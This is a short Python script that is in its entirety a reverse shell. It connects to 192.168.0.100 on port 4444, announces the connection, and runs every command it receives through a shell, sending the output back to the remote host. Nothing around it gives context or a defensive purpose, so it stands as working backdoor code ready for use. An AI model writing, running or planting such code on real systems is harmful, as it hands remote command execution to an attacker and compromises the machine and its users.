#!/usr/bin/env python

import socket
import subprocess

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.0.100", 4444))
connection.send("\r\n[+++] Connection established.\r\n")
while True:
    command = connection.recv(1024)
    if command:
        command_result = subprocess.check_output(command, shell=True)
        connection.send(command_result)
    else:
        connection.close()
